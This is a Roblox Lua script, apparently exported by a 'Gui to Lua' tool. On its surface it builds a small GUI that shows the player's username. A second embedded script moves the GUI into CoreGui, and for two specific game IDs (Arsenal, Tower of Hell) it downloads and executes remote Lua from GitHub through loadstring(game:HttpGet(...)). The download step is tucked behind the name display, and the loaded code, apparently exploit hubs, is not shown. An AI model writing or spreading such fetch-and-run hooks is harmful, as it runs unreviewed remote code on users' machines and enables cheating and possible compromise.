-- Gui to Lua
-- Version: 3.2

-- Instances:

local NameGUI = Instance.new("ScreenGui")
local main = Instance.new("Frame")
local lol = Instance.new("Frame")
local UICorner = Instance.new("UICorner")
local name = Instance.new("Frame")
local UICorner_2 = Instance.new("UICorner")
local username = Instance.new("TextLabel")
local UICorner_3 = Instance.new("UICorner")

--Properties:

NameGUI.Name = "Name GUI"
NameGUI.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")

main.Name = "main"
main.Parent = NameGUI
main.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
main.BorderSizePixel = 0
main.LayoutOrder = 1
main.Position = UDim2.new(0, 535, 0, 638)
main.Size = UDim2.new(0, 339, 0, 54)

lol.Name = "lol"
lol.Parent = main
lol.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
lol.BorderSizePixel = 0
lol.Position = UDim2.new(-0.000766945421, 0, 0, 0)
lol.Size = UDim2.new(0, 339, 0, 52)

UICorner.Parent = lol

name.Name = "name"
name.Parent = lol
name.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
name.BorderSizePixel = 0
name.Position = UDim2.new(0.023212906, 0, 0.167283282, 0)
name.Size = UDim2.new(0, 323, 0, 36)

UICorner_2.Parent = name

username.Name = "username"
username.Parent = name
username.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
username.BackgroundTransparency = 1.000
username.BorderSizePixel = 0
username.Position = UDim2.new(0.0201100912, 0, 0.170694992, 0)
username.Size = UDim2.new(0, 316, 0, 26)
username.Font = Enum.Font.Highway
username.Text = "Username"
username.TextColor3 = Color3.fromRGB(255, 255, 255)
username.TextScaled = true
username.TextSize = 14.000
username.TextWrapped = true
username.TextXAlignment = Enum.TextXAlignment.Left

UICorner_3.Parent = main

-- Scripts:

local function OCDHDM_fake_script() -- username.LocalScript 
	local script = Instance.new('LocalScript', username)

	local player = game:GetService("Players").LocalPlayer
	
	script.Parent.Text = player.Name
end
coroutine.wrap(OCDHDM_fake_script)()
local function GLBNFP_fake_script() -- NameGUI.Script 
	local script = Instance.new('Script', NameGUI)

	script.Parent.Parent = game.CoreGui
	
	--Arsenal
	if game.GameId == 286090429 then
		loadstring(game:HttpGet("https://raw.githubusercontent.com/ZinityDrops/OwlHubLink/master/OwlHubBack.lua"))();
	end
	
	--Tower of Hell
	if game.GameId == 1962086868 then
		loadstring(game:HttpGet(('https://raw.githubusercontent.com/RandomAdamYT/DarkHub/master/Init'), true))();
	end
end
coroutine.wrap(GLBNFP_fake_script)()
